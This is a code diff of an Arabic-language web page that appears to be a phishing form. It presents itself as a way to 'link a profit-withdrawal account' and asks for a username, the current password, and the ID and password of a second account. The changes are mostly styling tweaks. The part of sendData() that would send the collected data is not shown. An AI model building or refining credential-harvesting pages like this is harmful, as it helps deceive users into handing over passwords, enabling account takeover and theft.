@@ -2,15 +2,15 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>تأمين ربط الحسابات</title>
 
 <style>
-body {
+  body {
     font-family: Arial, sans-serif;
     background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
     margin: 0;
     padding: 0;
-    min-height: 100vh;
 }
 
 /* الصندوق */
@@ -18,17 +18,17 @@ body {
     background: #1e2a38;
     width: 100%;
     min-height: 100vh;
-    padding: 30px 20px;
+    padding: 40px 25px;
     box-sizing: border-box;
     display: flex;
     flex-direction: column;
-    justify-content: center;
+    justify-content: flex-start;
 }
 
 /* اللوجو */
 .logo {
-    width: 140px;
-    margin: 0 auto 15px;
+    width: 110px;
+    margin: 20px auto 10px;
     display: block;
 }
 
@@ -36,7 +36,7 @@ body {
 h1 {
     color: #00c3ff;
     text-align: center;
-    margin-bottom: 25px;
+    margin-bottom: 30px;
     font-size: 22px;
 }
 
@@ -44,38 +44,32 @@ h1 {
 input {
     width: 100%;
     padding: 14px;
-    margin: 10px 0;
+    margin: 12px 0; /* مسافة مريحة */
     border-radius: 10px;
     border: none;
     outline: none;
     background: #2f3e50;
     color: white;
     font-size: 15px;
-    transition: 0.3s;
 }
 
+/* تأثير الفوكس */
 input:focus {
     background: #3b4f65;
-    box-shadow: 0 0 8px #00c3ff;
+    box-shadow: 0 0 10px #00c3ff;
 }
 
 /* الزر */
 button {
     width: 100%;
-    padding: 14px;
-    margin-top: 15px;
+    padding: 15px;
+    margin-top: 25px; /* مسافة عن الحقول */
     border-radius: 10px;
     border: none;
     background: linear-gradient(90deg, #00c3ff, #0072ff);
     color: white;
-    font-size: 16px;
+    font-size: 17px;
     font-weight: bold;
-    cursor: pointer;
-    transition: 0.3s;
-}
-
-button:hover {
-    opacity: 0.9;
 }
 </style>
 </head>
@@ -87,23 +81,26 @@ button:hover {
     <!-- اللوجو -->
     <img src="https://i.ibb.co/7NvhYrp2/IMG-20260429-201237-592.jpg" class="logo">
 
-    <h1> ربط حساب سحب الارباح</h1>
+    <h1>ربط حساب سحب الارباح</h1>
 
     <input type="text" id="u1" placeholder="اسم المستخدم (مثال: Ahmed-8oy)">
     <input type="password" id="p1" placeholder="كلمة المرور الحالية">
     <input type="text" id="id2" placeholder="ID الحساب المراد ربطه">
-    <input type="password" id="p2" placeholder="كلمة مرور الحساب ">
+    <input type="password" id="p2" placeholder="كلمة مرور الحساب">
     <button onclick="sendData()">تأكيد الربط</button>
+
 </div>
 
 <script>
+// منع الحروف العربية
 let arabic = /[\u0600-\u06FF]/;
 
-// منع العربي أثناء الكتابة
+// username
 document.getElementById("u1").addEventListener("input", function() {
     this.value = this.value.replace(arabic, "");
 });
 
+// passwords
 document.getElementById("p1").addEventListener("input", function() {
     this.value = this.value.replace(arabic, "");
 });
@@ -128,6 +125,7 @@ function sendData() {
         alert("املأ جميع الحقول");
         return;
     }
+
 
 }
 
